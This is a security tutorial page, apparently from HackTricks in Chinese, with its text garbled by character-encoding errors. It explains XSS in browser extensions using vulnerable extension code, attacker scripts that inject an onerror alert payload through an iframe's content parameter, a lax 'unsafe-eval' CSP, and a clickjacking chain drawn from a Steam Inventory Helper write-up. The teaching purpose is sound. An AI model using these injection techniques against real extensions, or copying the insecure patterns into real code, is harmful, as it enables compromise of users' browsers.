# BrowExt - XSS ç¤ºä¾‹

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## é€šè¿‡ Iframe è¿›è¡Œè·¨ç«™è„šæœ¬æ”»å‡» (XSS)

åœ¨æ­¤è®¾ç½®ä¸­ï¼Œå®æ–½äº†ä¸€ä¸ª **å†…å®¹è„šæœ¬** æ¥å®ä¾‹åŒ–ä¸€ä¸ª Iframeï¼Œå°†å¸¦æœ‰æŸ¥è¯¢å‚æ•°çš„ URL ä½œä¸º Iframe çš„æºï¼š
```javascript
chrome.storage.local.get("message", result => {
let constructedURL = chrome.runtime.getURL("message.html") +
"?content=" + encodeURIComponent(result.message) +
"&redirect=https://example.net/details";
frame.src = constructedURL;
});
```
ä¸€ä¸ªå…¬å¼€å¯è®¿é—®çš„ HTML é¡µé¢ï¼Œ**`message.html`**ï¼Œæ—¨åœ¨æ ¹æ® URL ä¸­çš„å‚æ•°åŠ¨æ€æ·»åŠ å†…å®¹åˆ°æ–‡æ¡£ä¸»ä½“ï¼š
```javascript
$(document).ready(() => {
let urlParams = new URLSearchParams(window.location.search);
let userContent = urlParams.get("content");
$(document.body).html(`${userContent} <button id='detailBtn'>Details</button>`);
$('#detailBtn').on('click', () => {
let destinationURL = urlParams.get("redirect");
chrome.tabs.create({ url: destinationURL });
});
});
```
ä¸€ä¸ªæ¶æ„è„šæœ¬åœ¨å¯¹æ‰‹çš„é¡µé¢ä¸Šæ‰§è¡Œï¼Œä¿®æ”¹ Iframe æºçš„ `content` å‚æ•°ä»¥å¼•å…¥ **XSS payload**ã€‚è¿™æ˜¯é€šè¿‡æ›´æ–° Iframe çš„æºä»¥åŒ…å«æœ‰å®³è„šæœ¬æ¥å®ç°çš„ï¼š
```javascript
setTimeout(() => {
let targetFrame = document.querySelector("iframe").src;
let baseURL = targetFrame.split('?')[0];
let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>";
let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`;

document.querySelector("iframe").src = maliciousURL;
}, 1000);
```
ä¸€ä¸ªè¿‡äºå®½æ¾çš„å†…å®¹å®‰å…¨ç­–ç•¥ï¼Œä¾‹å¦‚ï¼š
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
å…è®¸æ‰§è¡ŒJavaScriptï¼Œä½¿ç³»ç»Ÿå®¹æ˜“å—åˆ°XSSæ”»å‡»ã€‚

å¼•å‘XSSçš„å¦ä¸€ç§æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªIframeå…ƒç´ ï¼Œå¹¶å°†å…¶æºè®¾ç½®ä¸ºåŒ…å«æœ‰å®³è„šæœ¬ä½œä¸º`content`å‚æ•°ï¼š
```javascript
let newFrame = document.createElement("iframe");
newFrame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=" +
encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>");
document.body.append(newFrame);
```
## DOM-based XSS + ClickJacking

è¿™ä¸ªä¾‹å­å–è‡ª[åŸå§‹å¸–å­å†™ä½œ](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)ã€‚

æ ¸å¿ƒé—®é¢˜æºäºä½äº **`/html/bookmarks.html`** çš„åŸºäºDOMçš„è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æ¼æ´ã€‚ä»¥ä¸‹æ˜¯æœ‰é—®é¢˜çš„JavaScriptï¼Œå±äº **`bookmarks.js`**ï¼š
```javascript
$('#btAdd').on('click', function() {
var bookmarkName = $('#txtName').val();
if ($('.custom-button .label').filter(function() {
return $(this).text() === bookmarkName;
}).length) return false;

var bookmarkItem = $('<div class="custom-button">');
bookmarkItem.html('<span class="label">' + bookmarkName + '</span>');
bookmarkItem.append('<button class="remove-btn" title="delete">x</button>');
bookmarkItem.attr('data-title', bookmarkName);
bookmarkItem.data('timestamp', (new Date().getTime()));
$('section.bookmark-container .existing-items').append(bookmarkItem);
persistData();
});
```
è¿™ä¸ªä»£ç ç‰‡æ®µä» **`txtName`** è¾“å…¥å­—æ®µè·å– **å€¼**ï¼Œå¹¶ä½¿ç”¨ **å­—ç¬¦ä¸²è¿æ¥ç”Ÿæˆ HTML**ï¼Œç„¶åé€šè¿‡ jQuery çš„ `.append()` å‡½æ•°å°†å…¶é™„åŠ åˆ° DOMã€‚

é€šå¸¸ï¼ŒChrome æ‰©å±•çš„å†…å®¹å®‰å…¨ç­–ç•¥ (CSP) ä¼šé˜²æ­¢æ­¤ç±»æ¼æ´ã€‚ç„¶è€Œï¼Œç”±äº **CSP æ”¾å®½äº† â€˜unsafe-evalâ€™** å’Œä½¿ç”¨ jQuery çš„ DOM æ“ä½œæ–¹æ³•ï¼ˆè¿™äº›æ–¹æ³•ä½¿ç”¨ [`globalEval()`](https://api.jquery.com/jquery.globaleval/) å°†è„šæœ¬ä¼ é€’ç»™ [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) åœ¨ DOM æ’å…¥æ—¶ï¼‰ï¼Œä»ç„¶å¯ä»¥è¿›è¡Œåˆ©ç”¨ã€‚

è™½ç„¶è¿™ä¸ªæ¼æ´å¾ˆé‡è¦ï¼Œä½†å…¶åˆ©ç”¨é€šå¸¸ä¾èµ–äºç”¨æˆ·äº¤äº’ï¼šè®¿é—®é¡µé¢ã€è¾“å…¥ XSS è´Ÿè½½å¹¶æ¿€æ´»â€œæ·»åŠ â€æŒ‰é’®ã€‚

ä¸ºäº†å¢å¼ºè¿™ä¸ªæ¼æ´ï¼Œåˆ©ç”¨äº†ä¸€ä¸ªæ¬¡è¦çš„ **clickjacking** æ¼æ´ã€‚Chrome æ‰©å±•çš„æ¸…å•å±•ç¤ºäº†ä¸€ä¸ªå¹¿æ³›çš„ `web_accessible_resources` ç­–ç•¥ï¼š
```json
"web_accessible_resources": [
"html/bookmarks.html",
"dist/*",
"assets/*",
"font/*",
[...]
],
```
æ˜¾è‘—åœ°ï¼Œ**`/html/bookmarks.html`** é¡µé¢å®¹æ˜“è¢«æ¡†æ¶åµŒå¥—ï¼Œå› æ­¤å®¹æ˜“å—åˆ° **clickjacking** æ”»å‡»ã€‚æ­¤æ¼æ´è¢«åˆ©ç”¨ï¼Œå°†é¡µé¢åµŒå…¥æ”»å‡»è€…çš„ç½‘ç«™ä¸­ï¼Œå¹¶ç”¨ DOM å…ƒç´ è¦†ç›–ï¼Œä»¥æ¬ºéª—æ€§åœ°é‡æ–°è®¾è®¡ç•Œé¢ã€‚è¿™ç§æ“æ§å¯¼è‡´å—å®³è€…æ— æ„ä¸­ä¸åº•å±‚æ‰©å±•è¿›è¡Œäº¤äº’ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS Hackingï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP Hackingï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
